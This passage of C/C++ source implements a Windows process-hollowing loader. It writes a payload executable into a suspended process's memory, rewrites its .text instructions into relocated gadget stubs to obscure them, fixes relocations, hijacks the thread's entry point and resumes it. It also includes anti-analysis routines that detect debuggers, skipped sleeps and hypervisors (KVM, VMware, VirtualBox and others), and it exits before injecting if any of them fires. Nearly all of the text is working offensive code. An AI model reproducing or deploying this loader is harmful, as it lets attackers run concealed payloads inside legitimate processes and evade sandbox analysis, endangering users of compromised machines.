    LPVOID imageBaseAddressPayload = VirtualAllocEx(processInfo.hProcess, startAllocatingAddress, fileHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(imageBaseAddressPayload == NULL){
        printf("[FAIL] Allocate space for image base address of payload process\n");
        TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
        return false;
    }
    printf("[SUCCESS] Allocate space for image base address of payload process - new image base address: %p\n", imageBaseAddressPayload);
    

    DWORD64 offsetPayload = (DWORD64)imageBaseAddressPayload - fileHeader->OptionalHeader.ImageBase;
    
    fileHeader->OptionalHeader.ImageBase = (DWORD64)imageBaseAddressPayload;
    // printf("offset:%p, %x\n", offsetIBAPayloadTarget, fileHeader->OptionalHeader.ImageBase);

    if(!WriteProcessMemory(processInfo.hProcess, imageBaseAddressPayload, payloadFile->content, fileHeader->OptionalHeader.SizeOfHeaders, NULL)){
        printf("[FAIL] Write the payload headers\n");
        TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
        return false;
    }
    printf("[SUCCESS] Write the payload headers: 0x%p - 0x%p\n", imageBaseAddressPayload, LPVOID((UINT64)imageBaseAddressPayload + fileHeader->OptionalHeader.SizeOfHeaders));
    

    BOOL hasRelocationSection = false;
    DWORD relocSectionSize = 0;
    DWORD relocSectionVirtualAddress = 0;
    if(fileHeader->OptionalHeader.DataDirectory[5].Size && fileHeader->OptionalHeader.DataDirectory[5].VirtualAddress){
        hasRelocationSection = true;
        relocSectionSize = fileHeader->OptionalHeader.DataDirectory[5].Size;
        relocSectionVirtualAddress = fileHeader->OptionalHeader.DataDirectory[5].VirtualAddress;
    } 

    PIMAGE_SECTION_HEADER sectionTableHeader = (PIMAGE_SECTION_HEADER)((BYTE*)fileHeader + sizeof(fileHeader->Signature) + sizeof(IMAGE_FILE_HEADER) + fileHeader->FileHeader.SizeOfOptionalHeader);
    PIMAGE_SECTION_HEADER currentSectionHeader = sectionTableHeader;
    PIMAGE_SECTION_HEADER relocSectionHeader = NULL;
    for(int i=0; i < fileHeader->FileHeader.NumberOfSections; i++){
        // printf("%s\n", currentSectionHeader->Name);
        if(hasRelocationSection && relocSectionVirtualAddress == currentSectionHeader->VirtualAddress && relocSectionSize == currentSectionHeader->Misc.VirtualSize){
            relocSectionHeader = currentSectionHeader;
        }

        if(!WriteProcessMemory(processInfo.hProcess, 
                                (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress, 
                                payloadFile->content + currentSectionHeader->PointerToRawData,
                                currentSectionHeader->SizeOfRawData, 
                                NULL)){
                                    printf("[FAIL] Write section %s to address: %p\n", currentSectionHeader->Name, (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress);
                                    TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
                                    return false;
        }else{    
            if (strncmp((char*)currentSectionHeader->Name, ".text", 5) == 0) {
                bool noSpaceLeftFlag = false;
                BYTE* dest = findFreeMemory(processInfo.hProcess, (BYTE*)imageBaseAddressPayload);
                if(dest == NULL){
                    printf("[FAIL] Find free memory for new instructions\n");
                }else{
                    printf("[SUCCESS] Find free memory for new instructions\n");
                    BOOL hasThirdDll = checkStaticImportedDLLs(payloadFile->content, fileHeader, "gdi32full.dll");
                    BYTE* ropMem = (BYTE*)VirtualAllocEx(processInfo.hProcess, dest/*NULL*/, 0x20000 /*0x4000*/, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if(ropMem == NULL){
                        printf("[FAIL] Allocate memory for new instructions\n");
                    }else{
                        printf("[SUCCESS] Allocate memory for new instructions: %p\n", ropMem);
                        uInt offsetRop = 0x70 * replaceAll_mov_reg_imm32(  
                                            (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress, 
                                            currentSectionHeader->SizeOfRawData,
                                            processInfo.hProcess, 
                                            ropMem,
                                            hasThirdDll);

                        if(offsetRop > 0x10000){
                            noSpaceLeftFlag = true;
                        }else{
                            offsetRop += 0x60 * replaceAll_call_rel32(  
                                                (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress, 
                                                currentSectionHeader->SizeOfRawData,
                                                processInfo.hProcess, 
                                                ropMem + offsetRop);
                        }
                    }
                }
                if(noSpaceLeftFlag){
                    BYTE* dest2 = findFreeMemory(processInfo.hProcess, (BYTE*)imageBaseAddressPayload);
                    if(dest2 == NULL){
                        printf("[FAIL] Find free memory for new instructions\n");
                    }else{
                        printf("[SUCCESS] Find free memory for new instructions 2\n");
                        BYTE* ropMem2 = (BYTE*)VirtualAllocEx(processInfo.hProcess, dest2, 0x20000 /*0x4000*/, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if(ropMem2 == NULL){
                            printf("[FAIL] Allocate memory for new instructions\n");
                        }else{
                            printf("[SUCCESS] Allocate memory for new instructions 2: %p\n", ropMem2);
                            if(!replaceAll_call_rel32(  
                                                (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress, 
                                                currentSectionHeader->SizeOfRawData,
                                                processInfo.hProcess, 
                                                ropMem2)){
                                                    printf("[FAIL] ROP - call\n");
                                                }
                        }
                    }
                }
                
            }
            printf("[SUCCESS] Write section %s to address: %p - %p\n", currentSectionHeader->Name, (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress, (BYTE*)imageBaseAddressPayload + currentSectionHeader->VirtualAddress + currentSectionHeader->SizeOfRawData);
        }
        currentSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)currentSectionHeader + sizeof(IMAGE_SECTION_HEADER));
    }
    
    if(hasRelocationSection){
        // printf("%p\n", (PIMAGE_BASE_RELOCATION)((DWORD64)imageBaseAddressPayload + relocVirtualAddress));
        DWORD64 offsetRelocBlock = 0;
        while(offsetRelocBlock < relocSectionSize){
            PIMAGE_BASE_RELOCATION relocationBlock = (PIMAGE_BASE_RELOCATION)(payloadFile->content + relocSectionHeader->PointerToRawData + offsetRelocBlock);
            DWORD offsetRelocEntry = 0; 
            while(offsetRelocEntry + sizeof(IMAGE_BASE_RELOCATION) < relocationBlock->SizeOfBlock){
                WORD entry = *(PWORD((BYTE*)relocationBlock + sizeof(IMAGE_BASE_RELOCATION) + offsetRelocEntry));
                WORD type = (entry>>12) & 0xF;
                WORD offset = entry & 0xFFF;
                offsetRelocEntry += sizeof(WORD);
                if(type == IMAGE_REL_BASED_ABSOLUTE){
                    continue;
                }
                LPVOID addrOfValueToUpdate = (BYTE*)imageBaseAddressPayload + relocationBlock->VirtualAddress + offset;
                DWORD64 value;
                if(!ReadProcessMemory(processInfo.hProcess, addrOfValueToUpdate, &value, sizeof(DWORD64), NULL)){
                    printf("[FAIL] Get value to update for relocating\n");
                    TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
                    return false;
                }
                
                value += offsetPayload;
                if(!WriteProcessMemory(processInfo.hProcess, addrOfValueToUpdate, &value, sizeof(DWORD64), NULL)){
                    printf("[FAIL] Update the value with offset\n");
                    TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
                    return false;
                }

            }
            offsetRelocBlock +=  sizeof(IMAGE_BASE_RELOCATION) + offsetRelocEntry;
        }
        printf("[SUCCESS] Relocation\n");   
    }
    
    CONTEXT context = {}; 
    context.ContextFlags = CONTEXT_FULL;
    if(!GetThreadContext(processInfo.hThread, &context)){
        printf("Failed getting the thread context\n");
        return false;
    }

    if(!WriteProcessMemory(processInfo.hProcess, (LPVOID)(context.Rdx + 0x10), &imageBaseAddressPayload, sizeof(DWORD64), NULL)){
        printf("Failed writing new image base address\n");
        return false;
    }

    context.Rcx = (DWORD64)imageBaseAddressPayload + fileHeader->OptionalHeader.AddressOfEntryPoint;
    
    if(!SetThreadContext(processInfo.hThread, &context)){
        printf("Failed setting the thread context\n");
        return false;
    }

    // for time measurement
    // ULONGLONG startTime = GetTickCount64();
    // ResumeThread(processInfo.hThread);
    // WaitForSingleObject(processInfo.hProcess, INFINITE);
    // DWORD exitCode = 0;
    // if (GetExitCodeProcess(processInfo.hProcess, &exitCode)) {
    //     if (exitCode == 0) {
    //         printf("Process exited successfully (exit code 0)\n");
    //     } else {
    //         printf("Process exited with error (exit code %lu)\n", exitCode);
    //     }
    // } else {
    //     printf("Failed to get exit code. Error: %lu\n", GetLastError());
    // }
    // ULONGLONG endTime = GetTickCount64();
    // printf("time: %llu ms\n", endTime - startTime);


    ResumeThread(processInfo.hThread);
    // WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);

    free(payloadFile->content);
    free(payloadFile);
    return true;
}

bool isDebugged(){
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if(hNtdll == NULL){
        printf("[FAIL] Get ntdll.dll handle for debug\n");
        return true;
    }
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    DWORD debugFlag = 0;
    // NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags, &debugFlag, sizeof(debugFlag), NULL);
    if(NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags, &debugFlag, sizeof(debugFlag), NULL) == STATUS_SUCCESS){
        return !debugFlag;
    }else{
        printf("[FAIL] Query the process for debug\n");
    }
    return true;
}

bool isTimeSkipped(){
    /*  
        check for sleep manipulation - first
        use a high resolution timestamps
    */
    LARGE_INTEGER frequency, counter1, counter2;

    //get the number of CPU ticks within a second
    if(QueryPerformanceFrequency(&frequency) == 0){     
        printf("[FAIL] Query frequency\n");
        return true;
    }
    if(QueryPerformanceCounter(&counter1) == 0){
        printf("[FAIL] Query counter 1\n");
        return true;
    } 

    Sleep(500);
    if(QueryPerformanceCounter(&counter2) == 0){
        printf("[FAIL] Query counter 2\n");
        return true;
    }
    
    // debugger may skip sleep functions so need to check for it
    if(((double)(counter2.QuadPart  - counter1.QuadPart) * 1000.0 / (double)frequency.QuadPart) < 490){     
        return true;
    }

    return false;
}

bool isUnderVirtualEnv(){
    
    int cpuInfo[4] = { -1 };

    __cpuid(cpuInfo, 1);

    if (!(cpuInfo[2] >> 31) & 1) { //check the last bit of ecx register
        return false;
    }

    char hypervisor_vendor[13] = {};
    __cpuid(cpuInfo, 0x40000000);
    memcpy(hypervisor_vendor + 0, &cpuInfo[1], 4); // ebx
    memcpy(hypervisor_vendor + 4, &cpuInfo[2], 4); // ecx
    memcpy(hypervisor_vendor + 8, &cpuInfo[3], 4); // edx
    hypervisor_vendor[12] = '\0';

    std::string vendor = hypervisor_vendor;

    if (vendor == "KVMKVMKVM" || vendor == "VMwareVMware" || vendor == "VBoxVBoxVBox" || 
        vendor == "prl hyperv" || vendor == " lrpepyh  vr" || vendor == "TCGTCGTCGTCG"){
        return true;
    }

    return false;
}

char* getCurrentFileName(char* fullPath){
    char* fileName;
    char* token = strtok(fullPath, "\\");
    while(token != NULL){
        fileName = token;
        token = strtok(NULL, "\\");
    }
    return fileName;
}

int main(int argc, char* argv[]){
    if(isUnderVirtualEnv()){
        printf("[FAIL] Run - hypervisor detected\n");
        return 0;
    }
    if(isDebugged() || isTimeSkipped()){
        printf("[FAIL] Run - debug detected\n");
        return 0;
    }
    if(!starting(getCurrentFileName(argv[0]))){
        printf("[FAIL] Injecting\n"); 
    }
    return 0;
}